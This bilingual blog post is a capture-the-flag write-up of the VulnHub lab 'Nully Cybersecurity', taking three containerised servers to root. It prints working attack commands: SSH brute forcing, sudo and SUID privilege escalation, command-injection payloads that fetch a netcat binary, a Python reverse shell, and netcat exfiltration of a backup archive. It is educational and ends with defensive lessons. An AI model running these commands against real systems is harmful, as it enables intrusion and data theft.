---
layout: post
title: "Nully Cybersecurity (VulnHub) — a beginner's walkthrough"
date: 2026-03-08
author: Nguyen Nam Khanh
tags: [vulnhub, walkthrough, pentest, privilege-escalation, pivoting]
description: >
  A full, beginner-friendly walkthrough of the Nully Cybersecurity VulnHub
  machine: from an unauthenticated port scan to root on three separate
  servers, pivoting through an internal Docker network along the way.
---

<style>
.lang-switch{display:inline-flex;border:1px solid #d0d7de;border-radius:8px;overflow:hidden;margin:0 0 2rem}
.lang-switch button{appearance:none;-webkit-appearance:none;border:0;background:#fff;color:#57606a;font:inherit;font-size:.9rem;line-height:1;padding:.5rem 1rem;cursor:pointer;transition:background .12s,color .12s}
.lang-switch button+button{border-left:1px solid #d0d7de}
.lang-switch button:hover{background:#f6f8fa}
.lang-switch button.active{background:#0969da;color:#fff}
.lang-switch button.active:hover{background:#0860ca}
.lang-vi{display:none}
body.wlang-vi .lang-en{display:none}
body.wlang-vi .lang-vi{display:block}
</style>

<div class="lang-switch" role="group" aria-label="Language / Ngôn ngữ">
  <button type="button" id="wl-en" class="active" onclick="setWLang('en')">English</button>
  <button type="button" id="wl-vi" onclick="setWLang('vi')">Tiếng Việt</button>
</div>

<div class="lang-en" markdown="1">

> **Lab use only.** Everything below is done against *Nully Cybersecurity: 1*,
> a deliberately vulnerable virtual machine running on my own isolated
> network. Never run these techniques against systems you do not own or do
> not have written permission to test.

If you are just getting into penetration testing, a "boot-to-root" machine is
one of the best ways to learn: you start with nothing but an IP address and
work your way up to full administrator (`root`) access. This box is a great
one to start with because it is not a single puzzle — it is **three** machines
chained together, and you have to *pivot* from one to the next.

By the end you will have touched almost every stage of a real engagement:
recon, reading a mail server, password cracking, command injection, reverse
shells, network pivoting, and four or five different privilege-escalation
tricks.

---

## Reproduce this at home

You can download the exact machine and follow along step by step.

| | |
|---|---|
| **Machine** | Nully Cybersecurity: 1 |
| **Author** | laf3r |
| **Source** | [VulnHub entry](https://www.vulnhub.com/entry/nully-cybersecurity-1,549/) |
| **Released** | 6 September 2020 |
| **Difficulty** | Easy–intermediate |
| **Format** | VirtualBox OVA (~1.4 GB), `NullyCybersecurityCTF.zip` |

**Setup I used:**

1. Download the OVA from the VulnHub page and import it into **VirtualBox**
   (the author notes it behaves better on VirtualBox than VMware). Verify the
   download against the MD5/SHA1 checksums listed on the VulnHub page before
   importing.
2. Put the target on a **Host-Only** adapter so it can only talk to your
   attacker VM, never the internet. This keeps the lab safe and your scan
   results clean.
3. Run a Kali (or any Linux) attacker VM on the same host-only network.

> Throughout this write-up the target first appears at `192.168.1.46`. Your IP
> will differ — substitute your own everywhere you see it. (This box was built
> in two sittings, so a couple of internal IPs shift partway through; I call
> that out where it happens.)

---

## Flag 1 — The mail server

### Find the target

We do not know the machine's IP yet, so we sweep the local network with
`netdiscover`, which sends ARP requests and lists every host that answers:

```bash
netdiscover -i eth1 -r 192.168.1.0/24
```

One host stands out at `192.168.1.46`, and its MAC address belongs to
*PCS Systemtechnik GmbH* — the vendor ID VirtualBox uses. That is our box.

### Scan it

`nmap` tells us which services are running. `-sC` runs safe default scripts,
`-sV` grabs version banners, `-v` is verbose:

```bash
nmap -sC -sV 192.168.1.46 -v
```

![nmap results showing five open ports]({{ '/images/nully-cybersecurity/01-nmap.png' | relative_url }})

Five ports are open:

| Port | Service |
|---|---|
| 80 | HTTP (web) |
| 110 | POP3 (email) |
| 2222 | SSH |
| 8000 | HTTP (another web app) |
| 9000 | (used later) |

The website on port 80 hints that only **POP3 (110)** and **SSH (2222)** are
meant to be attacked from the outside, and it hands us a set of mailbox
credentials.

### Read the mail over POP3

POP3 is an old, plain-text email protocol — we can talk to it by hand with
`telnet`. `USER` and `PASS` log in, `LIST` shows waiting messages, and
`RETR 1` reads the first one:

```bash
telnet 192.168.1.46 110
USER pentester
PASS qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
LIST
RETR 1
```

![Reading Bob's email over POP3]({{ '/images/nully-cybersecurity/02-pop3-mail.png' | relative_url }})

There is one message, from the mail-server admin **Bob Smith**, and he admits
his password is very simple. That is a strong hint: admins often reuse their
name, and a weak password invites brute force.

### Brute-force SSH as Bob

We build a small wordlist of names related to Bob (`username.txt`) and let
`hydra` try each entry as both the username and the password against SSH on
port 2222. `-f` stops at the first success:

```bash
hydra -L username.txt -P username.txt -f ssh://192.168.1.46:2222
```

It lands on **`bob` / `bobby1985`**.

![hydra finds bob's SSH password]({{ '/images/nully-cybersecurity/03-hydra-ssh.png' | relative_url }})

```bash
ssh bob@192.168.1.46 -p 2222
```

### From Bob to root

The first thing to check after landing on any Linux box is what the user is
allowed to run as someone else:

```bash
sudo -l
```

Bob can run `/opt/scripts/check.sh` as the user `my2user`. That script is
writable, so we append a line that launches a shell (`/bin/bash`) and run it —
a classic step sideways into another account:

```bash
sudo -u my2user /bin/bash /opt/scripts/check.sh
```

![Shell as my2user]({{ '/images/nully-cybersecurity/04-shell-my2user.png' | relative_url }})

Now as `my2user`, we check `sudo -l` again. This user can run **`zip` as root
without a password**. `zip` is on [GTFOBins](https://gtfobins.github.io/gtfobins/zip/#sudo),
which documents how everyday binaries can be abused. The trick:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

Why this works, in plain terms:

- `zip` is allowed to run as **root**, so anything it launches also runs as root.
- `-T` tells `zip` to *test* the archive after creating it.
- `-TT 'sh #'` replaces the normal test command with **our own** command.
  `zip` runs `sh` (a root shell) and the `#` comments out the rest of the line.

We now have a **root shell on the mail server**, and Flag 1.

---

## Flag 2 — Pivoting to the web server

Root on one machine is rarely the whole story. This box lives inside an
internal Docker network (`172.17.0.0/16`) that we can only see *from* the mail
server. Reaching those hidden machines is called **pivoting**. First we drop an
SSH key on the mail server as a stable backdoor, then explore.

### Map the internal network

From the mail server we scan the internal range with `netdiscover`:

```bash
netdiscover -i eth0 -r 172.17.0.0/16
```

`172.17.0.1` is the gateway. Probing the others:

- `172.17.0.3` has port **80** open → a **web server** (confirmed with `curl`).
- `172.17.0.2` has port **21** open → an FTP **file server** (used in Flag 3).

### Tunnel the hidden web app to our machine

Our attacker laptop cannot reach `172.17.0.x` directly, so we build an **SSH
tunnel** (local port forward) through the mail server. This makes the remote
web server show up as `localhost:8000` on our own machine:

```bash
ssh -L 8000:172.17.0.3:80 root@192.168.1.46 -p 2222 -i id_rsa
```

![Local port forward established]({{ '/images/nully-cybersecurity/05-ssh-tunnel.png' | relative_url }})

Now `http://localhost:8000` *is* the internal web server.

### Find the vulnerable page

`dirb` brute-forces common file and directory names to find hidden pages:

```bash
dirb http://localhost:8000
```

It reveals a listable `/ping/` directory containing `ping.php`. A note on the
page says to use a `host` parameter, and it runs that value without validating
it:

```
http://localhost:8000/ping/ping.php?host=172.17.0.1
```

![ping.php reflects command output — command injection]({{ '/images/nully-cybersecurity/06-ping-command-injection.png' | relative_url }})

That is a textbook **OS command injection**: whatever we append after a `;`
gets executed on the server.

### Get a shell as www-data

First we stage a `netcat` binary onto the target through the injection (the box
cannot install packages as the low-privileged web user, so we `wget` a copy we
host ourselves):

```
http://localhost:8000/ping/ping.php?host=; wget http://172.17.0.5:9000/nc
http://localhost:8000/ping/ping.php?host=; chmod 777 nc
```

The `nc` reverse shell did not fire (this build lacks the `-e` option), so we
fall back to a Python one-liner. It connects **back to a listener we run on the
mail server** — our pivot box — at `172.17.0.5:9000`:

```python
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("172.17.0.5",9000));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"])'
```

What each part does: create a network socket, connect it back to our listener,
wire the shell's input/output/errors (`0`,`1`,`2`) into that socket, then
launch an interactive shell.

> **IP note:** after a VM reboot the internal addresses shifted — at this point
> `172.17.0.5` is the mail server (our listener), `172.17.0.2` is the file
> server, and `172.17.0.3` is the web server. Adjust to whatever your own
> `netdiscover` shows.

![Reverse shell as www-data]({{ '/images/nully-cybersecurity/07-reverse-shell.png' | relative_url }})

We land as the low-privileged **`www-data`**.

### Two users, two escalations

Hunting for files owned by the interesting users turns up two leads:

```bash
find / -type f -user 1000 2>/dev/null   # Oscar
find / -type f -user 1001 2>/dev/null   # Oliver
```

- **Oliver** left a `.secret` backup file containing his password
  (`4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF`). We log in as Oliver.
- **Oscar** owns a **SUID** `python3` (a program that always runs as its owner).
  Running it with the privileged flag keeps Oscar's identity instead of
  dropping it:

  ```bash
  python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
  ```

  (`-p` = privileged mode: do not drop the elevated rights.) From Oscar's home
  we recover his password (`H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o`) and SSH in
  as Oscar properly.

### Root via a PATH hijack

In Oscar's home there is a `/scripts` folder with a SUID-root program called
`current-date`. **SUID-root** means it always runs as root, no matter who
starts it. We inspect its strings:

```bash
strings current-date
```

![strings output of current-date]({{ '/images/nully-cybersecurity/08-strings-current-date.png' | relative_url }})

It calls `date` **without a full path** (not `/bin/date`). That means the
system searches the folders in `$PATH` to find `date` — and we control `$PATH`.
So we plant a fake `date` that opens a *root-preserving* shell, put its folder
first in `$PATH`, and run `current-date`:

```bash
cd /tmp
printf '#!/bin/bash\n/bin/bash -p\n' > date
chmod +x date
export PATH=/tmp:$PATH
current-date
```

The `-p` matters: a normal `bash` drops SUID privileges on launch, so without
it you would fall back to your own user. With `-p`, the shell keeps the root
rights it inherited from the SUID `current-date`.

> The original report performed exactly this PATH-hijack but kept the precise
> commands in screenshots; the block above is the standard, working form of
> that technique.

![Root on the web server — 2_flag.txt]({{ '/images/nully-cybersecurity/09-root-web-server.png' | relative_url }})

We now own the **web server**, and `2_flag.txt` is ours.

---

## Flag 3 — The file server and the database server

### Loot the file server over anonymous FTP

From the web server we can reach the **file server** at `172.17.0.2`, which
allows **anonymous FTP** — log in with the username `anonymous` and no
password:

![Anonymous FTP enabled]({{ '/images/nully-cybersecurity/10-anonymous-ftp.png' | relative_url }})

Inside are `file.txt` (nothing useful) and `backup.zip`. We move the archive
back to our own machine with `netcat` so it is easier to work on:

```bash
# on the remote server
nc -w 3 192.168.18.145 8888 < backup.zip
# on our machine
nc -lvnp 8888 > backup.zip
```

### Crack the archive password

The zip is encrypted. `zip2john` turns it into a hash that `john`
(John the Ripper) can crack:

```bash
zip2john backup.zip > zip.hash
john zip.hash
```

The password is **`1234567890`**.

![john cracks the zip password]({{ '/images/nully-cybersecurity/11-john-zip-crack.png' | relative_url }})

Inside we find credentials for a user, **donald**, who has access to the
**database server**. We SSH to it from the web server.

### Root via the `screen` exploit

On the database server, `linpeas` (an automated privilege-escalation scanner)
flags a SUID binary: **`screen-4.5.0`**. That exact version has a well-known
local root exploit, [Exploit-DB 41154](https://www.exploit-db.com/raw/41154).

In short: `screen` runs as root, and this version mishandles its log-file
option, so it can be tricked into loading an attacker-supplied shared library
as root. The published exploit is a self-contained shell script — it writes and
compiles two small helper files (a library and a tiny root-shell program), then
launches `screen` so the library loads with root privileges:

```bash
# save Exploit-DB 41154 as 41154.sh, then:
chmod +x 41154.sh
./41154.sh
# -> drops you into a root shell
```

![Root on the database server]({{ '/images/nully-cybersecurity/12-root-db-server.png' | relative_url }})

That gives us **root on the database server** and the final flag. All three
servers owned.

---

## What this box teaches

If you are writing this up for a portfolio, the value is not the flags — it is
showing you understand *why* each step worked and how a defender stops it:

- **Reused / guessable passwords** (`bobby1985`) → enforce strong, unique
  passwords and rate-limit SSH.
- **Writable scripts run via `sudo`** → never let a user edit a script they can
  run as someone else.
- **GTFOBins binaries in `sudoers`** (`zip`) → grant the narrowest possible
  `sudo` rights, and check every allowed binary against GTFOBins.
- **Unvalidated input passed to the shell** (`ping.php`) → never build shell
  commands from user input; use safe APIs and allow-lists.
- **SUID programs that call binaries by name, not full path** (`current-date`)
  → always use absolute paths and reset `$PATH` in privileged programs.
- **Anonymous FTP + weak zip password** → disable anonymous access and treat
  "backup" files as crown jewels.
- **Outdated SUID software** (`screen 4.5.0`) → patch, and remove the SUID bit
  where it is not needed.

A single weak password at the edge turned into full control of an entire
internal network — because each machine trusted the one before it.

---

*Written by **Nguyen Nam Khanh** ([@Khanh1916](https://github.com/Khanh1916)).*

</div>

<div class="lang-vi" markdown="1">

> **Chỉ dùng trong lab.** Mọi thao tác bên dưới đều thực hiện trên *Nully
> Cybersecurity: 1*, một máy ảo cố ý cài lỗ hổng, chạy trong mạng cô lập của
> riêng tôi. Đừng bao giờ áp dụng những kỹ thuật này lên hệ thống bạn không sở
> hữu hoặc chưa có văn bản cho phép kiểm thử.

Nếu bạn vừa chân ướt chân ráo bước vào penetration testing, một máy dạng
"boot-to-root" là một trong những cách học tốt nhất: khởi đầu trong tay chỉ có
mỗi một địa chỉ IP, rồi từng bước leo lên quyền quản trị cao nhất (`root`). Đây
là một máy rất đáng để mở hàng, bởi nó không phải một câu đố đơn lẻ — nó là
**ba** máy nối chuỗi với nhau, và bạn buộc phải *pivot* (bắc cầu) từ máy này sang
máy kế tiếp.

Đi hết bài này, bạn sẽ chạm tay vào gần như mọi công đoạn của một kỳ đánh giá
thực tế: recon, đọc mail server, crack mật khẩu, command injection, reverse
shell, pivot mạng, cùng bốn năm chiêu leo quyền khác nhau.

---

## Dựng lại ngay tại nhà

Bạn hoàn toàn có thể tải đúng máy ảo này về và làm theo từng bước.

| | |
|---|---|
| **Máy** | Nully Cybersecurity: 1 |
| **Tác giả** | laf3r |
| **Nguồn** | [Trang VulnHub](https://www.vulnhub.com/entry/nully-cybersecurity-1,549/) |
| **Phát hành** | 6/9/2020 |
| **Độ khó** | Dễ–trung bình |
| **Định dạng** | VirtualBox OVA (~1.4 GB), `NullyCybersecurityCTF.zip` |

**Cấu hình tôi dùng:**

1. Tải OVA từ trang VulnHub rồi import vào **VirtualBox** (tác giả có lưu ý nó
   chạy mượt trên VirtualBox hơn VMware). Trước khi import, nhớ đối chiếu file
   tải về với checksum MD5/SHA1 ghi trên trang VulnHub.
2. Gắn máy mục tiêu vào card mạng **Host-Only** để nó chỉ nói chuyện được với máy
   tấn công của bạn, không ra nổi internet. Làm vậy vừa giữ lab an toàn, vừa cho
   kết quả quét sạch sẽ.
3. Chạy một máy tấn công Kali (hay Linux bất kỳ) trong cùng mạng host-only đó.

> Xuyên suốt bài, mục tiêu lần đầu xuất hiện ở `192.168.1.46`. IP của bạn chắc
> chắn sẽ khác — cứ thấy ở đâu thì thay bằng IP của bạn. (Máy này được dựng làm
> hai lần khác nhau, nên vài IP nội bộ có đổi chỗ giữa chừng; tôi sẽ nhắc ngay
> tại chỗ nó xảy ra.)

---

## Flag 1 — Mail server

### Tìm mục tiêu

Chưa biết IP của máy, nên ta rà mạng nội bộ bằng `netdiscover` — công cụ bắn ra
các gói ARP rồi liệt kê mọi host chịu trả lời:

```bash
netdiscover -i eth1 -r 192.168.1.0/24
```

Có một host nổi bật ở `192.168.1.46`, và địa chỉ MAC của nó thuộc về *PCS
Systemtechnik GmbH* — đúng mã nhà sản xuất mà VirtualBox hay dùng. Nó đây rồi.

### Quét cổng

`nmap` cho ta biết dịch vụ nào đang chạy. `-sC` chạy bộ script mặc định an toàn,
`-sV` lấy banner phiên bản, `-v` để in chi tiết:

```bash
nmap -sC -sV 192.168.1.46 -v
```

![Kết quả nmap với năm cổng mở]({{ '/images/nully-cybersecurity/01-nmap.png' | relative_url }})

Có năm cổng mở:

| Cổng | Dịch vụ |
|---|---|
| 80 | HTTP (web) |
| 110 | POP3 (email) |
| 2222 | SSH |
| 8000 | HTTP (một web app khác) |
| 9000 | (dùng ở phần sau) |

Trang web ở cổng 80 ngầm gợi ý rằng chỉ **POP3 (110)** và **SSH (2222)** mới là
mục tiêu được phép tấn công từ bên ngoài, và nó dúi luôn cho ta một bộ thông tin
đăng nhập hòm thư.

### Đọc mail qua POP3

POP3 là một giao thức email đời cũ, dạng văn bản thuần — ta có thể "nói chuyện"
tay bo với nó bằng `telnet`. `USER` và `PASS` để đăng nhập, `LIST` liệt kê thư
đang chờ, còn `RETR 1` đọc thư đầu tiên:

```bash
telnet 192.168.1.46 110
USER pentester
PASS qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
LIST
RETR 1
```

![Đọc email của Bob qua POP3]({{ '/images/nully-cybersecurity/02-pop3-mail.png' | relative_url }})

Chỉ có đúng một thư, gửi từ quản trị mail server **Bob Smith**, và anh chàng tự
thú mật khẩu của mình đơn giản lắm. Đó là một gợi ý rất đậm: admin hay đặt mật
khẩu theo tên mình, mà mật khẩu yếu thì chẳng khác gì mời brute force vào nhà.

### Brute-force SSH bằng tài khoản Bob

Ta soạn một wordlist nhỏ gồm những cái tên dính dáng đến Bob (`username.txt`),
rồi để `hydra` thử từng mục vừa làm username vừa làm password nhắm vào SSH cổng
2222. `-f` sẽ dừng ngay khi có phát trúng đầu tiên:

```bash
hydra -L username.txt -P username.txt -f ssh://192.168.1.46:2222
```

Kết quả: **`bob` / `bobby1985`**.

![hydra tìm ra mật khẩu SSH của bob]({{ '/images/nully-cybersecurity/03-hydra-ssh.png' | relative_url }})

```bash
ssh bob@192.168.1.46 -p 2222
```

### Từ Bob leo lên root

Việc đầu tiên nên làm sau khi đặt chân lên bất kỳ máy Linux nào là xem user này
được phép chạy gì dưới danh nghĩa người khác:

```bash
sudo -l
```

Bob được phép chạy `/opt/scripts/check.sh` dưới tài khoản `my2user`. Mà cái
script đó lại ghi được, nên ta chèn thêm một dòng mở shell (`/bin/bash`) rồi chạy
nó — một bước "đi ngang" kinh điển để nhảy sang tài khoản khác:

```bash
sudo -u my2user /bin/bash /opt/scripts/check.sh
```

![Shell với quyền my2user]({{ '/images/nully-cybersecurity/04-shell-my2user.png' | relative_url }})

Giờ đã là `my2user`, ta lại chạy `sudo -l`. User này được chạy **`zip` với quyền
root mà khỏi cần mật khẩu**. `zip` có tên trong [GTFOBins](https://gtfobins.github.io/gtfobins/zip/#sudo),
nơi liệt kê cách biến các binary thường ngày thành công cụ leo quyền. Chiêu như
sau:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

Vì sao nó ăn, nói cho dễ hiểu:

- `zip` được chạy với quyền **root**, nên bất cứ thứ gì nó khởi chạy cũng là root.
- `-T` bảo `zip` *kiểm thử* (test) cái archive sau khi tạo xong.
- `-TT 'sh #'` thay lệnh test mặc định bằng **lệnh của ta**. `zip` chạy `sh` (một
  shell root), còn dấu `#` biến phần còn lại của dòng thành chú thích.

Thế là ta đã có **shell root trên mail server**, kèm Flag 1.

---

## Flag 2 — Pivot sang web server

Có root trên một máy hiếm khi là trọn vẹn câu chuyện. Máy này nằm trong một mạng
Docker nội bộ (`172.17.0.0/16`) mà ta chỉ nhìn thấy được *từ* mail server. Việc
luồn tới những máy ẩn đó gọi là **pivoting**. Trước hết, ta thả một khóa SSH lên
mail server làm cửa hậu ổn định, rồi mới dò xét.

### Vẽ bản đồ mạng nội bộ

Từ mail server, ta quét dải mạng nội bộ bằng `netdiscover`:

```bash
netdiscover -i eth0 -r 172.17.0.0/16
```

`172.17.0.1` là gateway. Dò tiếp mấy máy còn lại:

- `172.17.0.3` mở cổng **80** → một **web server** (đã xác nhận bằng `curl`).
- `172.17.0.2` mở cổng **21** → một **file server** FTP (dùng ở Flag 3).

### Dẫn web app ẩn về máy mình

Laptop tấn công của ta không với thẳng tới `172.17.0.x` được, nên ta dựng một
**SSH tunnel** (local port forward) luồn qua mail server. Nhờ vậy, web server ở
xa hiện ra ngay thành `localhost:8000` trên máy mình:

```bash
ssh -L 8000:172.17.0.3:80 root@192.168.1.46 -p 2222 -i id_rsa
```

![Đã dựng local port forward]({{ '/images/nully-cybersecurity/05-ssh-tunnel.png' | relative_url }})

Giờ `http://localhost:8000` *chính là* web server nội bộ.

### Tìm trang dính lỗi

`dirb` dò vét các tên file và thư mục phổ biến để lần ra trang ẩn:

```bash
dirb http://localhost:8000
```

Nó lòi ra thư mục `/ping/` liệt kê được, bên trong có `ping.php`. Một ghi chú
trên trang bảo dùng tham số `host`, và nó đem giá trị đó chạy thẳng, không kiểm
tra gì sất:

```
http://localhost:8000/ping/ping.php?host=172.17.0.1
```

![ping.php phản chiếu output của lệnh — command injection]({{ '/images/nully-cybersecurity/06-ping-command-injection.png' | relative_url }})

Đây chính là **OS command injection** kiểu sách giáo khoa: bất cứ thứ gì ta nối
sau dấu `;` đều được đem ra thực thi trên server.

### Lấy shell với quyền www-data

Trước tiên ta tuồn một binary `netcat` lên mục tiêu thông qua lỗ injection (với
quyền web user hèn mọn, máy chẳng cài gói được, nên ta `wget` một bản tự host lấy):

```
http://localhost:8000/ping/ping.php?host=; wget http://172.17.0.5:9000/nc
http://localhost:8000/ping/ping.php?host=; chmod 777 nc
```

Reverse shell bằng `nc` không nổ (bản build này thiếu tùy chọn `-e`), nên ta
chuyển sang một dòng Python. Nó kết nối **ngược về listener đang chạy trên mail
server** — chính là máy pivot của ta — tại `172.17.0.5:9000`:

```python
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("172.17.0.5",9000));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"])'
```

Từng mảnh làm gì: tạo một socket mạng, kết nối ngược về listener của ta, đấu
input/output/lỗi của shell (`0`,`1`,`2`) vào socket đó, rồi bật một shell tương
tác.

> **Lưu ý về IP:** sau một lần reboot VM, các địa chỉ nội bộ bị đổi chỗ — tại
> thời điểm này `172.17.0.5` là mail server (listener của ta), `172.17.0.2` là
> file server, còn `172.17.0.3` là web server. Hãy chỉnh theo đúng những gì
> `netdiscover` của bạn hiển thị.

![Reverse shell với quyền www-data]({{ '/images/nully-cybersecurity/07-reverse-shell.png' | relative_url }})

Ta vào được với quyền còm cõi của **`www-data`**.

### Hai user, hai đường leo quyền

Lùng các file thuộc sở hữu của mấy user đáng ngờ, ta ra được hai manh mối:

```bash
find / -type f -user 1000 2>/dev/null   # Oscar
find / -type f -user 1001 2>/dev/null   # Oliver
```

- **Oliver** bỏ quên một file backup `.secret` chứa luôn mật khẩu của anh ta
  (`4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF`). Ta đăng nhập thành Oliver.
- **Oscar** sở hữu một `python3` có bit **SUID** (chương trình luôn chạy dưới
  quyền của chủ sở hữu). Chạy nó với cờ privileged sẽ giữ nguyên danh tính Oscar
  thay vì buông ra:

  ```bash
  python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
  ```

  (`-p` = chế độ privileged: không hạ cái quyền vừa nâng được.) Từ thư mục home
  của Oscar, ta moi ra mật khẩu của anh ta (`H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o`)
  rồi SSH vào đàng hoàng với tài khoản Oscar.

### Lên root bằng PATH hijack

Trong home của Oscar có một thư mục `/scripts` chứa chương trình SUID-root tên
`current-date`. **SUID-root** nghĩa là nó luôn chạy dưới quyền root, bất kể ai là
người khởi chạy. Ta soi các chuỗi nằm trong nó:

```bash
strings current-date
```

![Output strings của current-date]({{ '/images/nully-cybersecurity/08-strings-current-date.png' | relative_url }})

Nó gọi `date` **mà không kèm đường dẫn đầy đủ** (không phải `/bin/date`). Nghĩa
là hệ thống sẽ lần lượt tìm `date` trong các thư mục liệt kê ở `$PATH` — mà
`$PATH` thì lại nằm trong tay ta. Vậy ta cắm vào một `date` giả, hễ chạy là mở ra
shell *giữ nguyên quyền root*, đẩy thư mục của nó lên đầu `$PATH`, rồi chạy
`current-date`:

```bash
cd /tmp
printf '#!/bin/bash\n/bin/bash -p\n' > date
chmod +x date
export PATH=/tmp:$PATH
current-date
```

Cái `-p` ở đây mới là mấu chốt: một `bash` bình thường sẽ buông ngay quyền SUID
lúc khởi chạy, thiếu nó là bạn rớt về lại user của mình. Có `-p`, shell giữ
nguyên cái quyền root mà nó thừa hưởng từ `current-date` SUID.

> Báo cáo gốc cũng làm đúng kiểu PATH-hijack này nhưng giữ các lệnh chính xác ở
> trong ảnh chụp; khối lệnh trên là dạng chuẩn, chạy được, của kỹ thuật đó.

![Root trên web server — 2_flag.txt]({{ '/images/nully-cybersecurity/09-root-web-server.png' | relative_url }})

Thế là ta làm chủ **web server**, và `2_flag.txt` về tay.

---

## Flag 3 — File server và database server

### Vét sạch file server qua FTP ẩn danh

Từ web server, ta với được tới **file server** ở `172.17.0.2`, nơi cho phép **FTP
ẩn danh** — đăng nhập bằng username `anonymous` và bỏ trống mật khẩu:

![FTP ẩn danh được bật]({{ '/images/nully-cybersecurity/10-anonymous-ftp.png' | relative_url }})

Bên trong có `file.txt` (chẳng được tích sự gì) và `backup.zip`. Ta kéo cái
archive về máy mình bằng `netcat` cho dễ bề xoay xở:

```bash
# trên server từ xa
nc -w 3 192.168.18.145 8888 < backup.zip
# trên máy ta
nc -lvnp 8888 > backup.zip
```

### Crack mật khẩu archive

File zip có mã hóa. `zip2john` biến nó thành một hash để `john` (John the
Ripper) đem đi crack:

```bash
zip2john backup.zip > zip.hash
john zip.hash
```

Mật khẩu là **`1234567890`**.

![john crack mật khẩu zip]({{ '/images/nully-cybersecurity/11-john-zip-crack.png' | relative_url }})

Bên trong là thông tin đăng nhập của một user tên **donald**, người có quyền truy
cập **database server**. Ta SSH sang đó ngay từ web server.

### Lên root bằng lỗ hổng `screen`

Trên database server, `linpeas` (công cụ tự động dò đường leo quyền) khoanh vùng
một binary SUID: **`screen-4.5.0`**. Đúng cái phiên bản này có một lỗ hổng local
root nổi đình đám, [Exploit-DB 41154](https://www.exploit-db.com/raw/41154).

Nói gọn: `screen` chạy dưới quyền root, và bản này xử lý ẩu tùy chọn log-file,
nên có thể bị lừa để nạp một shared library do kẻ tấn công cung cấp dưới quyền
root. Exploit được công bố là một shell script tự chứa — nó tự viết và biên dịch
hai file phụ nhỏ (một library và một chương trình root-shell bé tẹo), rồi khởi
chạy `screen` để cái library được nạp với quyền root:

```bash
# lưu Exploit-DB 41154 thành 41154.sh, rồi:
chmod +x 41154.sh
./41154.sh
# -> thả bạn vào một shell root
```

![Root trên database server]({{ '/images/nully-cybersecurity/12-root-db-server.png' | relative_url }})

Thế là ta có **root trên database server** cùng flag cuối cùng. Cả ba server đều
đã về một mối.

---

## Máy này dạy ta điều gì

Nếu bạn viết lại cho portfolio, giá trị không nằm ở mấy cái flag — mà ở chỗ cho
người đọc thấy bạn hiểu *vì sao* mỗi bước lại ăn, và một người phòng thủ sẽ chặn
nó ra sao:

- **Mật khẩu tái sử dụng / dễ đoán** (`bobby1985`) → bắt buộc mật khẩu mạnh, duy
  nhất, và giới hạn tần suất đăng nhập SSH.
- **Script ghi được mà lại chạy qua `sudo`** → đừng bao giờ để user sửa được một
  script mà họ có quyền chạy dưới danh nghĩa người khác.
- **Binary GTFOBins nằm trong `sudoers`** (`zip`) → cấp quyền `sudo` hẹp hết mức
  có thể, và soi mọi binary được phép đối chiếu với GTFOBins.
- **Input không kiểm tra bị ném thẳng vào shell** (`ping.php`) → đừng bao giờ
  dựng lệnh shell từ input người dùng; hãy dùng API an toàn và allow-list.
- **Chương trình SUID gọi binary bằng tên thay vì đường dẫn đầy đủ**
  (`current-date`) → luôn dùng đường dẫn tuyệt đối và reset `$PATH` trong các
  chương trình đặc quyền.
- **FTP ẩn danh + mật khẩu zip yếu** → tắt truy cập ẩn danh và coi mấy file
  "backup" như của gia bảo.
- **Phần mềm SUID lỗi thời** (`screen 4.5.0`) → vá ngay, và gỡ bit SUID ở những
  chỗ không cần tới.

Một mật khẩu yếu ngoài rìa rốt cuộc đã biến thành quyền kiểm soát trọn vẹn cả một
mạng nội bộ — chỉ vì máy nào cũng tin tưởng cái máy đứng ngay trước nó.

---

*Viết bởi **Nguyễn Nam Khánh** ([@Khanh1916](https://github.com/Khanh1916)).*

</div>

<script>
function setWLang(l){
  document.body.classList.toggle('wlang-vi', l === 'vi');
  var en = document.getElementById('wl-en'), vi = document.getElementById('wl-vi');
  if(en) en.classList.toggle('active', l === 'en');
  if(vi) vi.classList.toggle('active', l === 'vi');
  try { localStorage.setItem('writeups-lang', l); } catch(e){}
}
(function(){
  var saved = 'en';
  try { saved = localStorage.getItem('writeups-lang') || 'en'; } catch(e){}
  setWLang(saved);
})();
</script>
